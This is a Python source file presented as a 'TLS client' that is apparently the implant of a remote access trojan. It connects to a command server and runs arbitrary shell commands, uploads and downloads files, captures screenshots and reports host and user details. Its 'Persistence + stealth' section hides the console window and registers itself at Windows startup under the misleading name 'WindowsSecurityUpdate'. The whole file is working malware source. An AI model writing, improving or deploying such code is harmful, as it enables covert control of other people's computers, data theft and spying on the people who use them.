"""
client.py - TLS client
#1  Heartbeat auto-pong
#2  Client IDs (UUID assigned locally, sent in hello)
#6  Logging
#7  Config from client_config.yaml
#8  Group tag
#11 Protobuf protocol
#12 Compression
#13 Exponential backoff reconnect
"""
from __future__ import annotations

import argparse
import asyncio
import getpass
import io
import logging
import os
import platform
import random
import socket
import ssl
import subprocess
import uuid

import messages_pb2 as pb
from config_loader import ClientConfig
from protocol import make_env, recv_envelope, send_envelope

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()],
)
log = logging.getLogger("tls_client")

CLIENT_UUID = str(uuid.uuid4())


def make_tls_context(cfg: ClientConfig) -> ssl.SSLContext:
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=cfg.ca_file)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    if cfg.use_client_cert:
        ctx.load_cert_chain(certfile=cfg.client_cert, keyfile=cfg.client_key)
    return ctx


def take_screenshot() -> bytes | None:
    try:
        import mss, mss.tools
        with mss.mss() as sct:
            shot = sct.grab(sct.monitors[1])
            return mss.tools.to_png(shot.rgb, shot.size)
    except Exception:
        pass
    try:
        from PIL import ImageGrab
        buf = io.BytesIO()
        ImageGrab.grab().save(buf, format="PNG")
        return buf.getvalue()
    except Exception:
        return None


async def handle_envelope(env: pb.Envelope, writer, cfg: ClientConfig) -> bool:
    """Process one incoming envelope. Returns False if connection should close."""
    kind = env.WhichOneof("payload")
    compress = cfg.compression

    if kind == "ping":
        r = make_env(CLIENT_UUID, cfg.group)
        r.pong.CopyFrom(pb.Pong())
        await send_envelope(writer, r, compress)

    elif kind == "info_request":
        ssl_obj = writer.get_extra_info("ssl_object") if hasattr(writer, "get_extra_info") else None
        r = make_env(CLIENT_UUID, cfg.group)
        r.info_response.CopyFrom(pb.InfoResponse(
            hostname=socket.gethostname(),
            username=getpass.getuser(),
            pid=os.getpid(),
            platform=platform.platform(),
            python=platform.python_version(),
            tls_version=ssl_obj.version() if ssl_obj else "?",
            cipher=ssl_obj.cipher()[0] if ssl_obj else "?",
        ))
        await send_envelope(writer, r, compress)

    elif kind == "exec_request":
        cmd = env.exec_request.cmd
        queue_id = env.exec_request.queue_id
        log.info(f"exec: {cmd!r}")
        try:
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            r = make_env(CLIENT_UUID, cfg.group)
            r.exec_response.CopyFrom(pb.ExecResponse(
                stdout=res.stdout, stderr=res.stderr,
                returncode=res.returncode, queue_id=queue_id,
            ))
        except subprocess.TimeoutExpired:
            r = make_env(CLIENT_UUID, cfg.group)
            r.exec_response.CopyFrom(pb.ExecResponse(stderr="timeout", returncode=-1, queue_id=queue_id))
        await send_envelope(writer, r, compress)

    elif kind == "file_header":
        fh = env.file_header
        if not fh.push:
            # server wants a file from us
            try:
                data = open(fh.path, "rb").read()
                r = make_env(CLIENT_UUID, cfg.group)
                r.file_header.CopyFrom(pb.FileHeader(path=fh.path, size=len(data), data=data, push=True))
                await send_envelope(writer, r, compress)
            except Exception as exc:
                r = make_env(CLIENT_UUID, cfg.group)
                r.error_msg.CopyFrom(pb.ErrorMsg(error=str(exc)))
                await send_envelope(writer, r, compress)
        else:
            # server pushes file to us
            try:
                os.makedirs(os.path.dirname(os.path.abspath(fh.path)), exist_ok=True)
                open(fh.path, "wb").write(fh.data)
                r = make_env(CLIENT_UUID, cfg.group)
                r.file_ack.CopyFrom(pb.FileAck(path=fh.path, size=len(fh.data)))
                await send_envelope(writer, r, compress)
            except Exception as exc:
                r = make_env(CLIENT_UUID, cfg.group)
                r.error_msg.CopyFrom(pb.ErrorMsg(error=str(exc)))
                await send_envelope(writer, r, compress)

    elif kind == "screenshot_req":
        data = take_screenshot()
        r = make_env(CLIENT_UUID, cfg.group)
        if data:
            r.screenshot_data.CopyFrom(pb.ScreenshotData(data=data))
        else:
            r.error_msg.CopyFrom(pb.ErrorMsg(error="screenshot unavailable"))
        await send_envelope(writer, r, compress)

    elif kind == "echo_request":
        r = make_env(CLIENT_UUID, cfg.group)
        r.echo_response.CopyFrom(pb.EchoResponse(text=env.echo_request.text))
        await send_envelope(writer, r, compress)

    elif kind == "bye":
        return False

    elif kind == "route_msg":
        log.info(f"Routed message received from group={env.group}")

    return True


async def run_connection(cfg: ClientConfig, ctx: ssl.SSLContext) -> None:
    reader, writer = await asyncio.open_connection(
        cfg.host, cfg.port,
        ssl=ctx,
        server_hostname=cfg.server_name,
    )
    ssl_obj = writer.get_extra_info("ssl_object")
    cipher = ssl_obj.cipher()[0] if ssl_obj else "?"
    log.info(f"Connected to {cfg.host}:{cfg.port} | {ssl_obj.version() if ssl_obj else '?'} | {cipher}")

    compress = cfg.compression

    # -- Send hello (#2 client UUID, #8 group) --------------------------------
    env = make_env(CLIENT_UUID, cfg.group)
    env.hello.CopyFrom(pb.Hello(
        auth_token=cfg.auth_token,
        hostname=socket.gethostname(),
        username=getpass.getuser(),
        pid=os.getpid(),
        platform=platform.platform(),
        python=platform.python_version(),
        group=cfg.group,
    ))
    await send_envelope(writer, env, compress)

    # -- #1 Heartbeat: client also sends periodic pings ------------------------
    async def heartbeat_loop():
        while True:
            await asyncio.sleep(30)
            try:
                r = make_env(CLIENT_UUID, cfg.group)
                r.ping.CopyFrom(pb.Ping())
                await send_envelope(writer, r, compress)
            except Exception:
                break

    asyncio.create_task(heartbeat_loop())

    # -- Main receive loop -----------------------------------------------------
    while True:
        incoming = await recv_envelope(reader)
        if not await handle_envelope(incoming, writer, cfg):
            break

    writer.close()
    await writer.wait_closed()


async def async_main(cfg: ClientConfig) -> None:
    ctx = make_tls_context(cfg)
    delay = cfg.initial_delay

    while True:
        try:
            await run_connection(cfg, ctx)
            delay = cfg.initial_delay   # reset on clean disconnect
        except KeyboardInterrupt:
            log.info("Client stopped.")
            return
        except Exception as exc:
            log.warning(f"Disconnected: {exc}")

        # -- #13 Exponential backoff with jitter -------------------------------
        jitter = random.uniform(0, cfg.jitter * delay)
        sleep_for = min(delay + jitter, cfg.max_delay)
        log.info(f"Reconnecting in {sleep_for:.1f}s ...")
        await asyncio.sleep(sleep_for)
        delay = min(delay * cfg.multiplier, cfg.max_delay)


# ── Persistence + stealth ─────────────────────────────────────────────────────

def hide_console() -> None:
    import sys
    if sys.platform != "win32":
        return
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def install_persistence() -> None:
    import sys
    if sys.platform != "win32":
        return
    try:
        import winreg
        exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        log.info("[persistence] Registered in startup")
    except Exception as exc:
        log.warning(f"[persistence] Failed: {exc}")

def main() -> None:
    hide_console()
    install_persistence()
    parser = argparse.ArgumentParser()
    parser.add_argument("--config", default="client_config.yaml")
    parser.add_argument("--host")
    parser.add_argument("--port", type=int)
    parser.add_argument("--auth-token")
    parser.add_argument("--group")
    args = parser.parse_args()

    cfg = ClientConfig.from_yaml(args.config)
    if args.host:       cfg.host = args.host
    if args.port:       cfg.port = args.port
    if args.auth_token: cfg.auth_token = args.auth_token
    if args.group:      cfg.group = args.group

    try:
        asyncio.run(async_main(cfg))
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()

